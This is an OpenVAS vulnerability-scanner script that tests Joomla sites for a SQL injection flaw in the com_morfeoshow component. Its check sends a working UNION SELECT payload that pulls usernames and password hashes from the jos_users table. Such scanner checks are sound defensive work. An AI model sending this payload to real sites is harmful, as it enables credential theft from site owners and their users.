##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_joomla_morfeoshow_sql_inj_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Joomla Component 'com_morfeoshow' SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let attackers to to cause SQL Injection attack
  and gain sensitive information.
  Impact Level: Application.";
tag_affected = "Joomla Morfeoshow component";
tag_insight = "The flaw is caused by improper validation of user-supplied input via the
  'idm' parameter in 'index.php', which allows attacker to manipulate
  SQL queries by injecting arbitrary SQL code.";
tag_solution = "No solution or patch is available as of 28th June 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://extensions.joomla.org/";
tag_summary = "This host is running Joomla and is prone to SQL injection
  vulnerability.";

if(description)
{
  script_id(902389);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-07-05 13:15:06 +0200 (Tue, 05 Jul 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Joomla Component 'com_morfeoshow' SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://securityreason.com/wlb_show/WLB-2011060085");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/102596/joomlamorfeoshow-sql.txt");

  script_description(desc);
  script_summary("Check if Joomla Morfeoshow component is vulnerable for SQL Injection attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

joomlaPort = get_http_port(default:80);
if(!joomlaPort){
  exit(0);
}

if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
  exit(0);
}

sndReq = http_get(item:string(joomlaDir, "/index.php?option=com_morfeoshow&" +
         "task=view&gallery=1&Itemid=114&Itemid=114&idm=1015+and+1=0+union+" +
         "select+1,2,concat(0x4f70656e564153,0x3a,password,name,0x3a,0x4f70" +
         "656e564153),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21+from+" +
         "jos_users+--+"), port:joomlaPort);
rcvRes = http_send_recv(port:joomlaPort, data:sndReq);
if(egrep(string:rcvRes, pattern:">OpenVAS:(.+):OpenVAS<"))
{
    security_hole(joomlaPort);
    exit(0);
}